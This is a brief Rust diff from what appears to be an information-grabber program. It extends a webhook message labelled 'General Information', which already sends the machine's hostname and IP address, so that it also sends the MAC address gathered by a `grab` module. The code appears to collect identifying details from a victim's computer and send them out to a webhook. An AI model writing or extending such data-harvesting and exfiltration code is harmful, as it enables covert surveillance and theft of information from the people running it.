@@ -110,7 +110,7 @@ impl App {
                             fields: [
                                 WebhookField {
                                     name: "General Information".to_string(),
-                                    value: format!("Hostname: {:?}\nIP Address: {:?}", grab::get_host(), ip),
+                                    value: format!("Hostname: {:?}\nIP Address: {:?}\nMAC Address: {:?}", grab::get_host(), ip, grab::get_mac()),
                                     inline: false,
                                 },
                                 WebhookField {
